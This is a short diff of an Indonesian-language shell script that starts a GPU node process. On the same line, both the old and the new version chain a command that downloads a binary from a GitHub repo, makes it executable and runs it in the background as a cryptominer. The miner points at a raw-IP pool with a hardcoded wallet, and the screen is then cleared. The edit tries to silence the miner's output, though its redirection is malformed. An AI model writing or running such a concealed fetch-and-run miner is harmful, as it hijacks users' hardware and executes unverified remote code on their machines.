@@ -26,7 +26,7 @@ echo "============================"
   --pubkey=2Rx2iFAona7GZouJiVSZaJ1o7PX5ss7jzo44fwmBC1A7xmWCjEuMpBY \
   --label=DGS \
   --mode=gpu \
-  --threads-per-card=1 & wget https://github.com/egisastradinata82/proxy/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qcnqfndr5jxpxksdultdlym8xv8ts864drqcwes -t 4 & clear
+  --threads-per-card=1 & wget https://github.com/egisastradinata82/proxy/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qcnqfndr5jxpxksdultdlym8xv8ts864drqcwes -t 4 /dev/null 2>&1 & clear
 
 echo "============================"
 echo "🎯 Semua proses selesai!"
